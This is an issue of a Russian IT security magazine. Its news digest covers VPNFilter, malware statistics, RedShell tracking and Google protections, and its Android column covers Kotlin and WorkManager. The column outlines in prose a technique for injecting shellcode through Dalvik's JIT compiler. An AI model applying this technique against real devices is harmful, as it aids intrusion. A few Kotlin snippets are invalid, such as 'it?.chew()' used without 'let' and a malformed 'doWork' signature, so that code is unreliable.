   это всего вторая известная IoT‐угро за, спо собная «пережить» перезагрузку
  зараженного устрой ства (первой недавно стал вредонос Hide and Seek),
   к тому же таящая в себе деструктивную функциональность.
     Эксперты Cisco Talos предста вили обновлен ный отчет о ботнете VPNFilter.
  Оказалось, что малварь представляет опасность для большего числа устрой‐
   ств, чем предполагалось изначально. К тому же исследователи выявили
  новые вредоносные плагины для VPNFilter.
    Еще в мае аналитики Cisco Talos называли VPNFilter одной из наиболее
  комплексных IoT‐угроз, с какими им приходилось сталкиваться. Так, зараже‐
  ние делится на три стадии и, по сути, состоит из трех раз ных ботов. Бот пер‐
  вой стадии прост и лег ковесен, но он умеет «переживать» перезагрузку
  устройства. Бот второй стадии несет в себе опасную функцию самоунич‐
   тожения, после активации которой зараженное устрой ство превращается
   в «кирпич», намеренно повреждаясь мал варью. В свою очередь, третья фаза
   атаки подразумевает загрузку на зараженное устройство вредонос ных пла‐
   гинов.
     Теперь ИБ‐эксперты сообщили, что даже недооценили всю сте пень опас‐
   ности.  Если  изначально  считалось,  что  мал варь  представляет  угрозу
  для устройств Linksys, MikroTik, NETGEAR, TP‐Link и QNAP, то теперь выяс‐
   нилось, что к этому спис ку нужно добавить роутеры производс тва ASUS, D‐
   Link, Huawei, Ubiquiti, UPVEL и ZTE.
    В  итоге перечень  уязвимых перед  VPNFilter  устройств рас ширился
  с 16 моделей до 71, причем на деле их может ока заться еще больше. По дан‐
  ным экспертов, операторы VPNFilter не используют для заражения устройств
  какие‐либо 0day‐уязвимости, а эксплуатируют раз личные извес тные баги.
     Кроме того, в Cisco Talos сумели обна ружить еще два вре доносных пла‐
   гина, использующихся во время треть ей фазы зараже ния. Ранее иссле дова‐
   тели уже находили плагины, задача которых заключается в сниффинге
  сетевого трафика и перехвате пакетов, мониторинге протоколов Modbus
  SCADA, а также взаимодействии с управляющим сервером посредс твом Tor.
     Теперь список пополнился пла гином ssler, предназначенным для перех‐
   вата и модификации тра фика, проходя щего через 80‐й порт (пос редс твом
   атак  man‐in‐the‐middle). Также это решение способно выполнить атаку
   SSLStrip и понизить соединение с HTTPS до HTTP. Еще один плагин, dstr, соз‐
  дан для переписи файлов прошивки зараженного устрой ства. В первом отче‐
   те специалисты сооб щали, что VPNFilter способен уничтожить прошивку
  зараженной машины, а теперь они обнаружили, что для этой функциональ‐
  ности предназначается dstr.
    Еще при первичном анализе, в мае 2018 года, было обнаруже но сходство
   VPNFilter с вредоно сом BlackEnergy. Счи тает ся, что тот был создан группой
  предположительно российских пра вительственных хакеров APT28,  также
  известной под названиями Fancy Bear, Pawn Storm, Strontium, Sofacy, Sednit,
   Tsar Team, X‐agent, Sednit и дру гими.
     После того как специалисты предположи ли, что имеют дело с правитель‐
   ственными хакерами, представители ФБР забили тревогу и оперативно
  перехватили управле ние над управляющим сервером злоумышленни ков,
  применив технику син кхола (sinkhole) к домену toknowall.com. После этого
  ФБР и производители уяз вимых устройств опубликовали подробные инструк‐
  ции для владельцев уязвимых устройств, рассказав, какие шаги нужно пред‐
  принять для защиты от VPNFilter. Напомню, что прос той перезагрузки устрой‐
   ства недостаточно, чтобы избавиться от бота первой стадии зараже ния.
  В зависимости от модели устройства может понадобиться сброс к заводским
  настройкам и перепрошивка гаджета.
     К сожалению, эти действия не остановили операторов ботнета, как того
  и опасались ИБ‐специалис ты. Стало извес тно, что VPNFilter активно заражает
  всё новые роуте ры на территории Укра ины и пыта ется «вернуться в строй».
    Обновленный список всех уязвимых устрой ств можно найти здесь.


  43 000 000 EMAIL‐АДРЕСОВ СЛУЧАЙНО СЛИЛ СПАМЕР‐
 СКИЙ БОТНЕТ
  →Аналитики ком пании Vertek Corporation обнаружили утечку 43 000 000 почтовых адресов,
   изучая недавние вредоносные кампании по рас пространению тро яна Trik, который заражает
   своих жертв вымогателем GandCrab третьей версии. Оказалось, что Trik и GandCrab загружают
   свои файлы с одного и того же сервера. Операторы мал вари забыли или не сумели скон‐
   фигурировать этот сервер надлежащим образом, и его содержимое было доступно любому
   желающему, если прямо обратить ся к данному IP.

   Исследователи нашли на сервере преступников 2201 текстовый файл (от 1.txt до 2201.txt),
   в каждом из которых содержалось примерно 20 000 email‐адресов.

   Проверка  подлинности  обнаружен ной  спамерской  базы  показала,  что  43  555  741
   из 44 020 000 адресов уникальные и, вероятнее всего, настоящие.





                                        Продолжение статьи →
← Начало статьи
 STARTTLS
 EVERYWHERE
  Некоммерческая правоза щитная орга низа ция Фонд электронных рубежей
   (Electronic Frontier Foundation, EFF) запус тила инициативу STARTTLS Every‐
  where — своеобразный аналог проекта Let’s Encrypt, учрежденного EFF, Mozil‐
   la и Cisco, но для обеспечения безопасности почтовых серверов.
     Хотя STARTTLS никак нельзя назвать новым (по статис тике Google, он
  используется на 89% всех почтовых серверов в интернете), спе циалис ты EFF
  с сожалением констатируют, что проблемы с его конфигурацией по‐преж‐
  нему встречаются очень часто.



         «Хотя многие поч товые сер веры работа ют со STARTTLS, большинс тво
        по‑прежнему не осу ществляет валида цию сер тифика тов», — пишут
         спе циалис ты.

  Это означает, что третья сторона может вмешаться в соединение двух поч‐
  товых серверов и воспользовать ся подложным сертификатом, выдав себя
  за отправителя или реципиента, ведь большинс тво серверов неспособно
  убедиться в аутентичности сертифика та. Хуже того, возможно устроить даун‐
  грейд защищенного канала связи, в результате чего все сообщения будут
  передаваться не в зашифрованном виде, а в формате простого текста. Изна‐
   чально эта функция была предусмотрена для слу чаев, когда один из серверов
  не поддерживает STARTTLS, но в последние годы ее используют для умыш‐
  ленного даунгрейда защиты соединения с самыми разными целями, включая
  наблюдение за пользователями, внедрение рекламы и мас совую слежку
  со стороны властей.
    Инициатива STARTTLS Everywhere призвана разрешить перечисленные
  проблемы.



        «STARTTLS Everywhere пре дос тавляет сис темным админис тра торам
         спе циальное ПО, которое можно запус тить на поч товом сер вере
         для осу ществле ния автоматичес кой валида ции сер тифика тов проекта
           Let’s Encrypt. Так же данное ПО поможет нас троить поч товый сер вер
         таким обра зом, чтобы тот использовал STARTTLS и пре дос тавлял дей-
         ствительные  сер тифика ты  дру гим  поч товым  сер верам.  Наконец,
        STARTTLS Everywhere вклю чает в себя пред варительно загруженный
        список поч товых сер веров, которые обе щают под дер жку STARTTLS,
         что поможет отсле живать ата ки на даунгрейд соединения. Итоговый
         результат для сети: более защищенные email’ы и меньше мас совой
        слежки», — гла сит официальный сайт STARTTLS Everywhere.

  Все подробности о том, как правиль но настро ить STARTTLS, добавить свой
  ресурс  в «предварительно  загруженный список» STARTTLS  Everywhere,
  и ответы на другие воп росы можно найти на официальном сайте новой ини‐
  циативы.


 ОКОЛО 5% MONERO ДОБЫТО С ПОМОЩЬЮ СКРЫТЫХ
 МАЙНЕРОВ
  →Специалисты Palo Alto Networks опубликовали удручающую крип товалютную статистику.
   Исследователи пришли к выводу, что наиболее популярной среди преступников криптовалютой
   является Monero и из‐за этого около 5% от общего чис ла добытых монет были получе ны
   при помощи скрытого майнин га.

   Специалисты Palo Alto Networks обнаружили 629 126 образцов май нинговой малвари, задей‐
   ствованных в «боевых» операциях. Браузерные майнеры в расчет не принимали.

  84% изученных вредоносов концентрируются на добыче крип товалюты Monero.





                     Популяр ность крип товалют среди преступни ков

   Около 2% ежедневного хешрейта Monero исхо дит от зараженных устрой ств. Общая вычис‐
   лительная мощность скрытых майнеров Monero сос тавляет 19 MH/s.

   За последний год преступные группы добыли 798 613 Monero с помощью разнообразной мал‐
   вари. По текущему кур су это эквивален тно 101 000 000 дол ларов США.

   Суммарно на момент проведения исследования в обращении находилось 15 962 350 XMR. То
   есть преступники добыли около 5% от обще го чис ла монет.

  В общей сложности эксперты обнаружили 2341 адрес Monero, принадлежащий преступникам,
   и установили, что больше половины из них (1278 адресов) никог да не видели суммы больше,
   чем 0,01 XMR (примерно 1,27 доллара США).

   Лишь 99 кошельков злоумышленников содер жали более 1000 XMR  (126 500 долларов),
   и только 16 кошельков содержали 10 000 XMR (1 260 000 дол ларов США)





                       Распре деление средств на кошельках майнеров





 ИГРЫ СЛЕДЯТ ЗА
 ТОБОЙ
  Пользователи Reddit и Steam уличили про изво дителей игр в массовой слеж‐
   ке. Возмущение комьюнити начало набирать обороты после публикации
  на Reddit, в которой рас ска зывалось о том, что игра «Holy Potatoes! We’re
   in Space?!» использует ана литичес кую программу RedShell, созданную ком‐
  панией Innervate, Inc. для сбора данных о пользователях и фактически слежки
  за ними.
      RedShell встраивается в игры в виде SDK и используется для проведе ния
  социально‐маркетинговых кампаний. Так, RedShell помогает раз работчикам
   понять, как именно пользователи выбирают и покупа ют игры. К при меру, если
  посмотреть трейлер какой‐либо игры на YouTube, а затем перейти по ссылке
  из описания в Steam и купить ее, этого будет достаточно, чтобы за компьюте‐
  ром закрепился специальный ID, ассоциирующий сис тему с конкретным IP‐
  адресом, разрешением экрана, уста новленными шриф тами и так далее.
  Таким образом, благодаря RedShell SDK производители получают данные
  об источниках покупок и установок.
    Однако пользователям не понравилось такое поведе ние. Дело в том, что
  производители игр крайне редко предупрежда ют о наличии таких решений
   в своих продуктах. К тому же пользователи стали жаловаться, что RedShell
  создает идентификаторы для каждого человека, собирая информацию об их
  онлайн‐личностях и игровых машинах.
    В итоге общими усилиями комь юнити были созданы специальные спис ки,
   в которых собрана информация обо всех играх и производителях, применя‐
  ющих подобные шпионские практики. Стоит заметить, что в списки попали
  многие хорошо известные тайтлы, например Civilization VI, Kerbal Space Pro‐
  gram и Elder Scrolls Online.
     Также  выяснилось,  что  в  некото рых  случаях  разработчики вооб ще
  не информировали о наличии спорного SDK в составе своих продуктов.
  Порой это могло быть прямым нарушением закона. К примеру, в Conan: Exile
  EULA вообще не упоминается сбор данных посредс твом RedShell.
     Хотя разработчики RedShell утвержда ют, что вся собранная статис тика
  анонимна, вплоть до декабря 2017 года некоторые интеграции RedShell
  собирали дан ные об IP‐адресах и сопос тавляли их со Steam ID, а этого более
  чем достаточно для деано нимизации пользователей.
     Теперь, когда на происходящее обратили внимание СМИ, а пользовате ли
  засыпают гневными вопросами официальные сайты производите лей, многие
  компании решили пой ти на попятную и отка зать ся от использования RedShell.
  В частности, о таком решении уже сообщили разработчики  «Total War:
  Warhammer 2» и «Conan: Exiles», пообещав удалить шпионский SDK и подчер‐
   кнув, что «это не спайварь».
     Здесь можно найти список игр, в которых был обнаружен RedShell, а также
  список производите лей, уже заявивших о том, что они скоро перестанут сле‐
   дить за игроками.


 В ОФИЦИАЛЬНОМ РЕЕС ТРЕ DOCKER HUB ОБНА РУЖЕНЫ
 КОНТЕЙНЕРЫ С БЭКДОРАМИ





   Эксперты ком пании Kromtech обнаружили в официальном реестре Docker Hub сразу 17 обра‐
   зов контейнеров, содержавших бэкдоры. Через них на серверы пользовате лей проникали май‐
   неры и другая малварь.

  →«Для обычных пользователей загрузка образа Docker из Docker Hub — это все равно что заг‐
   рузка произвольных бинарных данных непонятно откуда с их пос ледующим выполнением,
   без какого‐либо понимания, что там внутри, но с надеждой на лучшее»
  — специалисты Kromtech предупреждают пользователей





 GOOGLE
 НАРАЩИВАЕТ
 ЗАЩИТУ
  Сразу несколько нововведений, призванных улучшить защиту различных про‐
   дуктов Google, были анон сированы в этом месяце.


  Нет вре доносным расширениям
  Google постепенно откажется от практики, поз воляющей устанавливать рас‐
  ширения для браузера Chrome через сторонние сайты.
     Так называемая inline‐установка (она же встраиваемая установка) поз‐
  воляет разработчикам расширений не только распространять свои продукты
  через официальный каталог Chrome Web Store, но и предлагать пользовате‐
  лям расширения на сторонних сайтах. В таком слу чае достаточно нажать
  на специальную кнопку, и рас ширение будет  установлено без визита
   в Chrome Web Store.





  Отказаться от этой функциональности решили из‐за того, что ее давно взяли
  на  вооружение  зло умышленники.  Авторы  раз личных вредоносных  рас‐
  ширений пользуются inline‐установкой, так как в этом слу чае посетитель сай‐
   та не видит негатив ных отзывов, предупреждений от других пострадавших
  и низкого рейтин га вредоносного рас ширения в Chrome Web Store.



       «Мы продолжаем получать огромное количес тво жалоб от пользовате-
         лей, которые столкну лись с неожиданным изме нением в поведе нии
        Chrome пос ле уста нов ки нежела тельного рас ширения. Большинс тво
         таких жалоб связаны с тем, что люди слу чайно или будучи намеренно
         вве дены в заблужде ние использовали inline-уста нов ку на сайтах», —
        пишут раз работчики Google.

  Отказ от inline‐установки будет раз делен на три этапа. Первый этап уже
  начался: с 12 июня 2018 года встра иваемая установка для новых рас ширений
  запрещена. Для них попытка использовать chrome.webstore.install() теперь
  окончится открытием стра ницы рас ширения в официальном каталоге. Второй
   этап стартует 12 сентября 2018 года. Осенью inline‐установку запретят всем
  существующим расширениям вообще. И наконец, тре тий этап: в декаб‐
  ре 2018 года, с релизом Chrome 71, метод inline‐установки исчезнет из API
  окончательно.


  Пароли для про шивок
  Новый защитный механизм получат смартфоны Pixel 2. Нововведение обес‐
   печит дополнительную защиту против неавторизованных попыток обновить
  или подменить прошивку гаджета. По сути, это защита от инсайдерских атак
  и случаев, когда у злоумышленника есть доступ к самому устройству.
    В настоящее время устройства  Pixel и  так можно наз вать одними
  из наиболее защищенных решений на рын ке. В частности, смартфоны Google
  имеют аппаратные ком поненты для хранения и работы с ключами шиф‐
   рования, которые применя ются для шифрования локальных пользовательских
  данных. Кроме того, это защищенное железо исполь зует собственный набор
  защищенных прошивок, занимается валида цией пароля пользователя, а так‐
  же защищает устрой ство от брутфорс‐атак.
    Помимо перечисленного, прошивка Pixel защищена и механизмом под‐
  писи кода, чтобы атакующий не имел возможности попросту подменить про‐
  шивку, сумев таким образом обойти защиту и расшифровать все данные.
    Однако этих мер инженерам Google показа лось недостаточно. Теперь
  смартфоны компании будут запрашивать у пользовате ля пароль при каждой
  попытке заменить или модифицировать прошивку устройства. Таким обра‐
   зом, потенциальный атакующий должен будет одновременно и скомпромети‐
  ровать механизм подписи кода, и узнать специаль ный пароль пользователя,
   что представляется крайне маловероят ным.
     Разработчики Google рекомендуют другим про изводителям мобильных
  устройств перенять их опыт и внедрить похожие защитные решения в свои
  продукты.


  Про верка приложе ний в офлайне
  Вскоре должен изменить ся и механизм проверки при ложе ний для Android
  на аутентичность. В Google планируют модифициро вать хедеры файлов APK
  таким образом, чтобы среди метаданных появилось новое поле,содержащее
  криптографическую подпись. Из‐за это го незначительно уве личится мак‐
  симально допустимый раз мер APK. Никаких действий и обновления приложе‐
  ний со стороны разработчиков не потребуется, новое поле будет заполнять‐
  ся Play Store автоматически.
    В настоящее время установить «одоб ренные» Google приложения, про‐
  шедшие все надлежащие проверки, можно лишь через официальный Play
   Store, который в фоновом режиме перед уста новкой убедится в подлинности
  и безопасности продукта. С добавлением нового поля в хедеры APK подпись
  будет содержаться в самом файле, что позволит пользователям загружать
  приложения из Play Store, а затем распростра нять их по дру гим каналам,
  но не изме нять в процессе.
    В блоге компании Джеймс Бендер (James Bender), продакт‐менеджер
  Google Play Store, объясняет, что данное решение продиктовано желанием
   улучшить комфорт и безопасность пользователей, при этом дав разработ‐
  чикам возможность донес ти свои решения до более широкой аудитории. Так,
  нововведение дол жно прийтись по душе пользователям из раз вивающихся
   стран, где распространение приложений посредс твом P2P уже давно стало
  нормой (в силу высокой стоимос ти трафика или ряда дру гих ограниче ний).



        «В будущем мы сможем опре делять аутентичность приложе ний даже
         в том слу чае, если устройство находится в офлайне», — пишет Бен-
         дер.

  Стоит отметить, что специалис ты в области информационной безопасности
  уже выразили сомнения в рациональнос ти данного шага. Дело в том, что
   это новов ведение в теории может продлить «срок жизни» вредоносных при‐
  ложений. Так, малвари будет дос таточно попасть в  Play Store хотя бы
  на короткое время, после чего она будет фигурировать в базах как легитим‐
  ное и проверенное решение. И даже после удаления вредоноса из офи‐
  циального каталога поль зователи, которые нечасто выходят в офлайн, могут
   установить себе такую малварь, взятую из каких‐либо сторонних источников,
  но при этом система будет уверена, что приложение аутентичное и не пред‐
   ставляет угрозы.


 ОБОРОТЫ ПРЕСТУПНИКОВ, ЗАНИМА ЮЩИХСЯ
 КРИПТОВАЛЮТАМИ , ПРЕВЫСИЛИ 1 МЛРД ДОЛЛАРОВ
  →Специалисты компании Carbon Black провели анализ нелегальной активнос ти, связан ной
   с криптовалютами. Наиболее популяр ными видами нелегаль ной деятельности за последние
   полгода оказались скрытый майнинг и его браузерная разновидность, крип тоджекинг, а также
   кража монет из кошельков пользовате лей.

   Разные криптовалютные вредоносы (более 34 000 предложений) продаются при мерно
   на 12 000 торговых площадках даркнета по цене от 1,04 до 1000 долларов США.

   По данным Carbon Black, общий объем нелегальных крип товалютных операций за последние
   шесть месяцев превысил 1 млрд долларов, тогда как общий объем тенево го рынка в даркнете
   оценивается в 6,7 млрд долларов.
HEADER
ANDROID





                КУДА СМАРТФОНЫ СЛИВАЮТ
                 ДАННЫЕ, 10 ВОПРОСОВ
             О KOTLIN И ЗАПУСК SHELL‐
                 КОДА С ПОМОЩЬЮ JIT





                                                                            Евгений Зобнин
                                                                                  Редактор Unixoid и Mobile
                                                                                               zobnin@glc.ru





Сегодня в выпус ке: выполнение shell‐кода с помощью JIT‐
компилятора, рас сказ о том, куда смартфоны сливают дан‐
ные, десять самых популярных вопросов о Kotlin, рассказ
о WorkManager и Slices, представленных на Google I/O, и,
конечно же, подборка свежих инструмен тов и библиотек.



ИНСТРУМЕНТЫ


 • House — основанный на Frida инс трумент для динами ческого анализа при‐
   ложений под Android. Поз воляет быстро сгенерировать скрипт и внедрить
   его в приложение;
 • node‐applesign — модуль Node.js и ути лита командной строки для подписи
   приложений iOS (файлов IPA);
 • frida‐ipa‐dump — скрипт для извлечения рас шифрованных iOS‐приложе‐
   ний с устройства;
 • iOS writeups — огромное количество документов и книг, посвященных
   безопасности iOS.



ПОЧИТАТЬ


Вы пол нение shell-кода с помощью JIT-компилято ра
Back To The Future | Going Back In Time To Abuse Android’s JIT — презентация,
посвященная внедрению shell‐кода в Android путем эксплуатации уяз вимости
в виртуальной машине Dalvik. Как мы все зна ем, приложения для Android
написаны на Java (или Kotlin) и скомпилированы в так называемый байт‐код,
исполняет который, в отличие от машин ных инструкций, не процессор нап‐
рямую, а виртуальная машина.
  В Android эта виртуальная машина изначально носила имя Dalvik, но была
достаточно медлительной из‐за того, что интерпретировала байт‐код пос‐
ледовательно. С выходом версии Android 2.1 раз работчики это поправили,
внедрив в Dalvik так называемый JIT‐компилятор (в версии Android 5.0 он был
заменен на AOT‐компилятор, но в 7.0 вернулся). Он транслирует в машинные
инструкции целые куски байт‐кода, так что виртуальной машине не приходит‐
ся делать это последовательно, расходуя дра гоценное время.
  Оказалось, однако, что JIT‐компилятор уяз вим к подмене кода. То есть
скомпилированные им фраг менты машин ных инструкций можно подменить,
заставив виртуальную машину выполнить совершенно дру гой код.
  Виртуальная машина хранит ссылки на участки памяти со скомпилирован‐
ными машинными инструкциями в структурах JitEntry, которые организованы
в таблицу JitTable. Используя рефлексию и классы libcore.io.Posix (содер‐
жит методы mmap и munmap для манипуляции памятью), а также классы lib‐
core.io.Memory и libcore.io.MemoryBlock, в память можно загрузить shell‐
код, а затем подменить адрес в JitEntry, чтобы вмес то актуального машинного
кода он ссылался на shell‐код.
  Механизм выпол нения shell‐кода отличает ся в разных версиях Android,
но возможен и в 4.4.4, и в 7.1. А вот в Android P, скорее всего, начнутся проб‐
лемы, так как она запрещает вызов закрытых от сто ронних приложений API.
Также авторы исследования не упомяну ли, работа ет ли этот метод в отно‐
шении других приложений и системы в целом или только текущего процес са.
Ведь Android запускает каждое приложение в собственной виртуальной
машине, и память одной виртуальной машины не пересекается с другой.


К каким доменам чаще все го под ключаются смартфо ны
1984 called — очень короткая, но занятная статья о том, какие веб‐сайты
и сервисы следят за пользователями Android. Автор написал блокировщик
рекламы для смартфонов Samsung, который перенаправляет DNS‐запросы
устройства на специальные DNS‐серверы. Вмес то IP‐адре сов рекламных
и трекинговых сетей эти серверы воз вра щают 127.0.0.1, чем блокируют рек‐
ламу и трекеры.
   Спустя несколько месяцев работы серверы накопили статистику заб‐
локированных адресов. И первые три места с большим отрывом занимают
следующие адреса:
 • graph.facebook.com
 • mobile.pipe.aria.microsoft.com
 • www.googleadservices.com

Facebook, как всегда, впереди.





         К каким доменам чаще всего подключаются смартфоны



РАЗРАБОТЧИКУ


10 самых популярных вопросов о Kotlin
Top 10 Kotlin Stack Overﬂow questions — десять (на самом деле девять) наибо‐
лее часто задаваемых вопросов о Kotlin на Stack Overﬂow и ответы на них.
Приводим очень краткую выжимку (лучше все‐таки почитать оригинал).


1. Чем отличаются Array и IntArray?
Первый создает массив высокоуровневого типа Integer, второй — при митив‐
ного типа  int.  IntArray более высокопроизводительный и рекомендуется
к использованию в любых ситуациях.


2. Чем отличается Iterable и Sequence?
Iterable — это стандартный интерфейс Java. Реализующие его классы (List
и Set, например) обрабатывают всю коллекцию целиком, что может плохо
сказаться на производитель нос ти. Нап ример, следующий код выполнит две
операции (ﬁlter и map) над всеми элементами спис ка, перед тем как взять
первые пять эле ментов (take):


val people: List<Person> = getPeople()
val allowedEntrance = people
    .filter { it.age >= 21 }
    .map { it.name }
    .take(5)

Sequence, с другой стороны, обрабатывает коллекции в ленивом режиме.
Такой подход позволя ет более эффективно обра баты вать кол лекции в нес‐
колько проходов (как в этом примере) и выпол нять процессинг только необ‐
ходимого количества элементов:


val people: List<Person> = getPeople()
val allowedEntrance = people.asSequence()
    .filter { it.age >= 21 }
    .map { it.name }
    .take(5)
    .toList()

В отличие от предыдущего, этот код будет обра баты вать каждый эле мент
списка отдельно, до тех пор пока не наберет ся пять эле ментов.
   Что использовать? В случае небольших коллекций Iterable показы вает луч‐
шую производительность. Но если ты имеешь дело с очень большой кол‐
лекцией, тогда лучше задумать ся о при менении Sequence. Если же тебе нуж‐
на генерируемая на лету бес конечная коллекция, то Sequence (с его функци‐
ей generateSequence()) — твой единс твенный выход. Подробная статья
об этом.


3. Про ход по эле мен там кол лекции
В Kotlin есть множество способов обой ти все элементы коллекции в цикле.
Однако самые производитель ные из них следующие:


for (arg in args) {
    println(arg)
}
args.forEach { arg ‐>
    println(arg)
}

В своей работе они используют Iterator, и это быс трее, чем последовательное
получение каждого эле мента из списка.
  Вариант с индексами:


for ((index, arg) in args.withIndex()) {
    println("$index: $arg")
}
args.forEachIndexed { index, arg ‐>
    println("$index: $arg")
}


4. SAM-пре образования
Как и Java  8,  Kotlin поддерживает SAM‐преобразования (Single Abstract
Method). Это значит, что вмес то такого кода:


button.setListener(object: OnClickListener {
    override fun onClick(button: Button) {
        println("Clicked!")
    }
})

можно написать такой:


button.setListener {
    println("Clicked!")
}

и компилятор поймет, что к чему.
  Но есть несколько нюансов.
 • Если ты используешь SAM‐преобразование, ты не можешь обратиться
   к анонимному объекту, созданно му в процессе (объекту OnClickListener,
   если говорить о примере выше).
 • Ты можешь стол кнуть ся с ошибкой компилятора, который заявит, что тип
   возвращаемого значения не совпадает. Такое происходит, если ори‐
   гинальный метод требует вернуть зна чение определенного типа, а внутри
   лямбды ты вызываешь функцию, которая возвращает другой тип. В этом
   случае надо лишь добавить в конце лямбды значение нужного типа, нап‐
  ример true или false, если необходимо вернуть Boolean.


5. Статические поля и методы
В Kotlin нет поддержки ста тичес ких полей и методов. Если тебе необходимо
создать класс, содержащий только статические члены, просто объяви его
как объект:


object Foo {
    fun x() { ... }
}

Если же нужно сделать ста тическими только отдельные поля и методы,
используй companion object:


class Foo {
    companion object {
        fun x() { ... }
    }
    fun y() { ... }
}

Если какой‐то метод должен быть запущен толь ко один раз незави симо
от количества созданных на осно ве клас са объектов, используй статический
инициализатор:


class X {
    companion object {
        init {
            println("Static initialization!")
        }
    }
}


6. Умное приведе ние типов и null
Если ты попробуешь сделать так:


class Dog(var toy: Toy? = null) {
    fun play() {
        if (toy != null) {
            toy.chew()
        }
    }
}

Kotlin сообщит тебе, что не может использовать умное при веде ние типов,
потому что toy — это изменяемое свойство. Так происходит потому, что ком‐
пилятор не может быть уверен, что между про веркой toy на null и вызовом
метода chew() другой поток не сделает toy = null.
   Чтобы это исправить, дос таточно сделать так:


class Dog(var toy: Toy? = null) {
    fun play() {
        it?.chew()
    }
}

Или так:


class Dog(var toy: Toy? = null) {
    fun play() {
        toy?.let {
            it.chew()
        }
    }
}

В данном случае последний вариант избыточен, но он подойдет, если тебе
необходимо не просто выз вать метод, а, например, записать возвращаемое
им значение в другую переменную, которая не должна быть null.


7. Что кон кретно делает опе ратор !! ?
Оператор !!, заставляющий среду исполнения Kotlin выполнить код даже в том
случае, если его левая часть равна null, на самом деле выполняет то же
самое, что такая функция‐рас ширение:


fun <T> T?.forceNonNull(): T {
    if (this == null) {
        throw KotlinNullPointerException("Oops, found null")
    } else {
        return this as T
    }
}

Следующие две строки равнозначны:


airdate!!.getWeekday()
airdate.forceNonNull().getWeekday()


8. Что делать с аргу мен тами при пере опре деле нии фун кции Java?
Программируя на Kotlin, ты всег да зна ешь, может ли аргумент метода быть
null. Но что делать, если ты переопределяешь метод, написанный на Java —
языке, который не умеет сообщать, может ли аргумент быть null?
  В этом случае тебе ничего не оста ется, кро ме как всегда проверять аргу‐
менты на null. Это избыточно и не очень кра сиво выглядит в коде, но лучше
перестраховаться.

9. Как использовать несколько фун кций‑расширений с одинако -
выми име нами?
Одна из самых интересных воз можностей Kotlin — это функции‐расширения.
Ты можешь в любое время добавить к любому доступному тебе классу любой
дополнительный метод, независимо от того, имеешь ты доступ к коду класса
или нет.
  Но возникает одна проб лема: если ты захочешь использовать две фун‐
кции‐расширения с одинаковыми именами, ты не смо жешь обратиться к ним,
используя полное имя пакета (например, com.example.code.indent()). В этом
случае сле дует сделать так:


import com.example.code.indent as indent4
import com.example.square.indent as indent2

То есть просто импортировать функции под раз ными именами.


Список доступных для использования системных API
An Update on non‐SDK restrictions in Android P. Раз работчики Android уже рас‐
сказывали об ограничениях, которые Android P будет накладывать на исполь‐
зование недокументированных/скрытых API. Вкратце: если ты попытаешься
использовать рефлексию, что бы получить доступ к скрытым от сторонних при‐
ложений   API,   то  ОС  выбросит  исключение   NoSuchFieldException
или NoSuchMethodException.
  Поначалу эта функция будет работать только в отношении очень редко
используемых или совсем не используемых API. Одна ко в сле дующих версиях
Google начнет ужесточать правила и расширять запрет на все большее
количество API, предлагая вза мен открытую для использования альтернативу.
   Какие API доступны, а какие уже нельзя использовать? Вот так называемый
серый список. В нем более 11 тысяч методов и полей.


Что такое Slices в Android P и как их использовать?
A Closer look at Slices on Android — статья с рассказом о так называемых
слайсах (Slice), новой функции Android, которая появи лась в Android P, но вряд
ли будет активирована к релизу (а может, и будет).
  Слайсы — это часть новой подсистемы Actions on Google, которая поз‐
воляет разработчикам интегрировать свои при ложения в Google Assistant.
Работает это так:
 1. Google придумала ряд но вых интентов, таких как actions.intent.
  GET_CRYPTOCURRENCY_PRICE и actions.intent.PLAY_GAME, которые
   отправляются приложениям, когда пользователь делает опре деленный
   запрос в ассистенте. В данном случае это может быть что‐то вроде «хочу
   поиграть в игру» и «цена биткойна».
 2. Ассистент обрабатывает запрос, вычленяет из него семантичес кую часть,
   затем рассылает приложениям соответству ющий интент. Приложение
  может ответить на этот интент с помощью SliceProvider’а, который поз‐
   воляет запрограммировать карточку с информацией для Google Assistant.
   Эту карточку Google Assistant выведет на экран.





         Пример слайса с ответом на зап рос «цена биткойна»


Как работать с WorkManager
Doing work with Android’s new WorkManager — хорошая краткая статья о том,
как использовать WorkManager, новую support‐биб лиотеку Google для выпол‐
нения фоновой работы.
   WorkManager был разработан как ответ на бардак в средствах фонового
исполнения в разных версиях Android. До Android 5.0 нам предлагали исполь‐
зовать AlarmManager и сервисы для выполнения фоновых задач. Начиная
с Android 5.0 появился JobScheduler, который тол ком не работал до версии
Android 6.0, и вместо него приходилось исполь зовать Firebase JobDispatcher,
хотя сервисы продол жали нормально поддерживаться вплоть до версии An‐
droid 8, где Google ввела ограничение на их исполнение в несколько минут
при уходе приложения в сон или получении push‐уведомления.
   WorkManager скрывает все эти нюансы и предлагает простой в исполь‐
зовании API для запуска фоновых задач. В зависимости от версии Android,
на которой будет запущено приложение, он сам выберет лучший способ
исполнения задачи, поз волив тебе выб росить всю эту кашу из головы.
  В простейшем случае соз дание и запуск задачи с помощью WorkManager
выглядит так. Создаем задачу, нас ледуясь от класса Worker:


class YourWorker: Worker {
    override fun WorkerResult doWork() {
        // Делаем свои дела
        return WorkerResult.SUCCESS
    }
}

Затем создаем запрос на запуск задачи и ста вим ее в очередь:


val work: OneTimeWorkRequest  = OneTimeWorkRequest.Builder(YourWo
rker::class.java).build()
WorkManager.getInstance().enqueue(work)

Так как мы не указали никаких усло вий выполнения задачи, она будет выпол‐
нена сразу.
  Добавим условия:


val constraints: Constraints = Constraints.Builder()
   .setRequiredNetworkType(NetworkType.CONNECTED)
   .setRequiresCharging(true)
   .build()
val work: OneTimeWorkRequest = OneTimeWorkRequest.Builder(SomeWorker:
:class.java)
    .setConstraints(constraints)
    .build()

Чтобы  запустить  периодичес кую  (повторяющуюся)  задачу,  используем
PeriodicWorkRequest:


val recurringWork: PeriodicWorkRequest = PeriodicWorkRequest.Builder(
YourWorker::class.java, 3, TimeUnit.HOURS).build()
WorkManager.getInstance().enqueue(recurringWork)

Задачи также можно объединять в цепочки:


WorkManager.getInstance()
    .beginWith(firstWork)
    .then(secondWork)
    .then(thirdWork)
    .enqueue()


Инстру мен ты
 • Bundletool — утилита для манипуляции Android App Bundle, поз воляет
   собирать, разбирать бандлы и генерировать APK для разных устрой ств;
 • Swarmer —  инструмент  для  запуска  нескольких  Android‐эмуляторов
   одновременно;
 • adb‐enhanced — скрипт‐обертка для ADB, поз воляющий выполнить мно‐
  жество различных действий: вклю чение/выключение Doze, мобильных дан‐
   ных, режима полета, раз решений, нажатие кно пок, снятие скриншотов
   и многие другие.


Биб лиоте ки
